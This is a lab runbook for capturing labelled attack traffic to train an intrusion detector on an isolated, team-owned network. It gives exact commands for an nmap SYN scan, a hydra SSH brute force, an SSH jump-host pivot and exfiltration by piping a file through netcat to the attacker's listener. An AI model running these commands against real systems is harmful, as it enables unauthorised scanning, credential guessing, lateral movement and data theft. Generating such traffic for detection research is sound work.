# Attack scenarios (M11.2)

Exact commands and timings for the lab capture. The point of this capture is the three stages
our labelled data has **zero windows** for: **lateral_movement** and **exfiltration**, which
CIC-IDS-2018 lacks entirely, and **recon**, which the four days we fetched never label. It adds
a **slow-scan** variant to measure lead-time degradation. Read `CONSENT.md` first. Targets and credentials are team-owned
only; the network is isolated.

Roles (static IPs set before capture, see `capture.sh`):
- **attacker / gateway** `172.20.0.1`
- **victim** `172.20.0.10` (runs SSH + a web service)
- **pivot target** `172.20.0.20` (reachable from the victim, not directly from the attacker)
- **benign devices** `172.20.0.100+`

Record the wall-clock **start and end** of every scenario in the operator log
(`takes/<id>.operator-log.txt`, tab-separated: `stage  start  end  attacker_ip  victim_ip`).
`label_capture.py` reads exactly that.

---

## 0. Benign warm-up — 2 min (label: `benign`)

On the benign devices, generate ordinary traffic (do **not** browse personal accounts):
```
# scripted benign, e.g.:
while true; do curl -s http://172.20.0.10/ >/dev/null; sleep $((RANDOM % 5 + 1)); done
```

## 1. Reconnaissance — nmap SYN scan (label: `recon`, T1046)
```
# attacker -> victim, full TCP SYN sweep
nmap -sS -p1-1024 172.20.0.10
```
Log start/end. Fast, sequential ports → high `sequential_port_ratio`.

## 2. Initial access — SSH brute force (label: `initial_access`, T1110)
```
# DUMMY accounts created for the capture only — never a real password
hydra -L users.txt -P passwords.txt ssh://172.20.0.10 -t 4
```
`users.txt`/`passwords.txt` are throwaway lists; the last pair succeeds so the pivot can proceed.

## 3. Lateral movement — SSH pivot (label: `lateral_movement`, T1021) **[not in CIC]**
```
# from the attacker, through the now-compromised victim, reach the pivot target
ssh -J labuser@172.20.0.10 labuser@172.20.0.20 'hostname; ip addr'
# then an internal scan FROM the victim toward the pivot subnet
ssh labuser@172.20.0.10 'nmap -sS -p22,80,445 172.20.0.20'
```

## 4. Exfiltration — large outbound transfer (label: `exfiltration`, T1048) **[not in CIC]**
```
# pull a ~50 MB dummy file OUT through the victim (no real data)
ssh labuser@172.20.0.10 'cat /tmp/dummy_50mb.bin' | nc 172.20.0.1 4444
```
`dummy_50mb.bin` is random bytes (`head -c 50M /dev/urandom > /tmp/dummy_50mb.bin`). High
`sent_bytes` to a single destination → the exfiltration signature.

## 5. Slow-scan variant (label: `recon`, separate take) — lead-time degradation
```
nmap -sS -T1 -p1-1024 172.20.0.10      # paranoid timing: minutes, not seconds
```
Run as its own take so the slow-scan curve (M11.5) is measured against the fast scan.

---

**Takes:** record at least 3 clean sessions. The best full-chain take becomes the bundled
`app/assets/backup_capture.{pcap,csv}`; the slow-scan take feeds the degradation plot.
Extract features with the SAME extractor as everything else: `python -m data.extract` after
converting the take into the per-day layout, or feed the pcap straight to the app.
